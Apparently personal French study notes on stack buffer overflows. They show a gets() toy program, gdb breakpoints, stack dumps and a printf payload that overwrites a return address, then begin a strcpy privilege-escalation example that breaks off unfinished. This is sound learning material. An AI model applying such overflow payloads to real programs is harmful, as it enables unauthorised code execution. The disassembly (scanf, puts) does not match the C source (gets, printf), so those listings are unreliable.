https://insecure.org/stf/smashstack.html
**Rappel**
![[Pasted image 20240218103950.png]]
[[Global/Programming/C C++/Syntaxe#^450a14|Fonction gets()]]


#### **Théorie**

- Étant donné que la fonction gets ne vérifie pas la taille de l'input ni la taille du buffer à laquelle elle fait référence, on va pouvoir faire un stack overflow qui consiste à remplacer l'adresse de retour de la fonction dans laquelle elle est appelée par l'adresse qu'on veut.

#### **Pratique**

##### **Exploit 1 / Démonstration**

- **Code source :**
```C
#include <stdio.h>
void return_input();
int main(){
	return_input();
	return 0;
}
void return_input(void){
	char array[30];
	gets(array);
	printf("%s\n", array);
}
```

```nasm
Code asm de la fonction main
   0x0000555555555149 <+0>:     push   rbp
   0x000055555555514a <+1>:     mov    rbp,rsp
   0x000055555555514d <+4>:     mov    eax,0x0
   0x0000555555555152 <+9>:     call   0x55555555515e <return_input>
   0x0000555555555157 <+14>:    mov    eax,0x0
   0x000055555555515c <+19>:    pop    rbp
   0x000055555555515d <+20>:    ret
```

``` nasm
   Code asm de la fonction return_input
   0x000055555555515e <+0>:     push   rbp
   0x000055555555515f <+1>:     mov    rbp,rsp
   0x0000555555555162 <+4>:     sub    rsp,0x20
   0x0000555555555166 <+8>:     lea    rax,[rbp-0x20]
   0x000055555555516a <+12>:    mov    rsi,rax
   0x000055555555516d <+15>:    lea    rax,[rip+0xe90]        # 0x555555556004
   0x0000555555555174 <+22>:    mov    rdi,rax
   0x0000555555555177 <+25>:    mov    eax,0x0
   0x000055555555517c <+30>:    call   0x555555555040 <__isoc99_scanf@plt>
   0x0000555555555181 <+35>:    lea    rax,[rbp-0x20]
   0x0000555555555185 <+39>:    mov    rdi,rax
   0x0000555555555188 <+42>:    call   0x555555555030 <puts@plt>
   0x000055555555518d <+47>:    nop
   0x000055555555518e <+48>:    leave
   0x000055555555518f <+49>:    ret
```

- **Analyse du code source :**
	- Là on voit que array est un buffer de 30 [[Global/Programming/C C++/Syntaxe#^34615d|char]] et qu'on a une influence sur cette variable grâce à gets().

- **Exploitation**
	- Dans gdb, on va mettre un breakpoint au moment de l'appel de la fonction gets() (ligne 10 du code asm de la fonction return_input) et au moment de l'instruction ret (ligne 16) de return_input afin d'analyser la mémoire avant et après notre input :
		- `b *0x000055555555517c`
		- `b *0x000055555555518f`
	- Au premier breakpoint, on check la mémoire autour de [[Opcode-Register#^0ac733|RSP]] pour voir où se trouve l'adresse de retour. Normalement, l'adresse qu'on cherche correspond à l'adresse juste après (dans notre cas) l'appel de la fonction où on se trouve. Pour nous ça devrais être l'adresse 0x0000555555555157 à la ligne 6 du code asm de main.
		- `x/20x $rsp`
```nasm
Mémoire de la stack
0x7fffffffda60: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffda70: 0x00000000      0x00000000      0xf7fe6780      0x00007fff
0x7fffffffda80: 0xffffda90      0x00007fff      0x55555157      0x00005555 <- ici
0x7fffffffda90: 0x00000001      0x00000000      0xf7def6ca      0x00007fff
0x7fffffffdaa0: 0xffffdb90      0x00007fff      0x55555149      0x00005555
```
- 
	- Ensuite, on continue le programme et on entre une input de plus de 30 char. Ensuite, quand tu touche le 2ème breakpoint, tu réinspectes comment la mémoire autour de RSP a bougé.
		- `continue`
		- `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
		- `x/20x 0x7fffffffda60`
```nasm
Mémoire de la stack
0x7fffffffda60: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffda70: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffda80: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffda90: 0x41414141      0x00004141      0xf7def6ca      0x00007fff
0x7fffffffdaa0: 0xffffdb90      0x00007fff      0x55555149      0x00005555
```
- 
	- L'adresse de retour a bien été changée. On va maintenant recommencer et essayer de caler l'adresse de l'appel de la fonction return_input (0x0000555555555152) dans main à la place de l'adresse de retour de la stack. On va se servir de la fonction printf dans le shell pour envoyer l'input dans le programme :
		- `printf "AAAAAAAAAAAAAAAAAAAAAAAAAA\x52\x51\x55\x55\x55\x55\x00\x00" | ./programme`
		- On aurait aussi pu le faire comme ça : `./victim $(printf “foo”)`
	- Si tu as bien géré le placement de l'adresse de retour, tu devrais recevoir 2 fois l'output.

- **Conclusion**
	- On peut donc aller à n'importe quel endroit du script si on a une influence sur une adresse de retour. On pourrait très bien, dans un programme de connexion, aller directement à l'adresse de l'instruction qui s'occupe de nous connecter au programme. 


##### **Exploit 2 / Privilege Escalation**

- **Code source**
```C
int main(int argc,char *argv[]){
	char little_array[512];
	if (argc > 1)
		strcpy(little_array, argv[1]);
}
```
```nasm
Code asm de la fonction main
   0x0000555555555139 <+0>:     push   rbp
   0x000055555555513a <+1>:     mov    rbp,rsp
   0x000055555555513d <+4>:     sub    rsp,0x210
   0x0000555555555144 <+11>:    mov    DWORD PTR [rbp-0x204],edi
   0x000055555555514a <+17>:    mov    QWORD PTR [rbp-0x210],rsi
   0x0000555555555151 <+24>:    cmp    DWORD PTR [rbp-0x204],0x1
   0x0000555555555158 <+31>:    jle    0x55555555517a <main+65>
   0x000055555555515a <+33>:    mov    rax,QWORD PTR [rbp-0x210]
   0x0000555555555161 <+40>:    add    rax,0x8
   0x0000555555555165 <+44>:    mov    rdx,QWORD PTR [rax]
   0x0000555555555168 <+47>:    lea    rax,[rbp-0x200]
   0x000055555555516f <+54>:    mov    rsi,rdx
   0x0000555555555172 <+57>:    mov    rdi,rax
   0x0000555555555175 <+60>:    call   0x555555555030 <strcpy@plt>
   0x000055555555517a <+65>:    mov    eax,0x0
   0x000055555555517f <+70>:    leave
   0x0000555555555180 <+71>:    ret
```

- **Analyse du code source**
	- On voit dans le code C que notre arguments est passé dans un buffer avec une taille limitée grâce à la fonction strcpy qui ne fait pas gaffe à la mémoire.

- **Exploitation**
	- 